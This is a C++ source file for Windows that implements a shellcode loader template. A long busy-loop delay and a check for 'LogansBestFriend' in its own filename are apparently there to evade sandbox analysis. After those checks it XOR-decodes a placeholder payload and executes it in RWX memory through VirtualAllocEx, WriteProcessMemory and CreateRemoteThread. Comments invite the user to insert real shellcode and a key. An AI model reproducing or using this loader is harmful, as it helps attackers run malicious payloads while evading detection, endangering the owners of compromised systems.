#include "Windows.h"
#include "stdio.h"
#include <iostream>
#include <string>
#include <regex>

#define MAX_OP 89888996 
void shellcode();

using namespace std;

int main(int argc, char* argv[])
{
    char path[MAX_PATH];
    int cpt = 0; 
    int i = 0; 
    for (i = 0; i < MAX_OP; i++)
    {
        cpt++;
    }
    if (cpt == MAX_OP) 
    {
        GetModuleFileNameA(NULL, path, MAX_PATH); 
        regex str_expr("(.*)(LogansBestFriend)(.*)"); 

        if (regex_match(path, str_expr)) { 
            shellcode(); 
        }
    }
    return 0; 
}

void shellcode()
{

    unsigned char shellcode[] = "\x90\x90\x90"; // Place shellcode here
    char key = 'K'; // Change key here
    int i = 0;
    for (i; i < sizeof(shellcode) - 1; i++)
    {
        shellcode[i] = shellcode[i] ^ key;
    }


    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;

    DWORD pnameid = GetCurrentProcessId();
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pnameid); 
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); 
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); 
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); 
    CloseHandle(processHandle);
    WaitForSingleObject(remoteThread, INFINITE);

}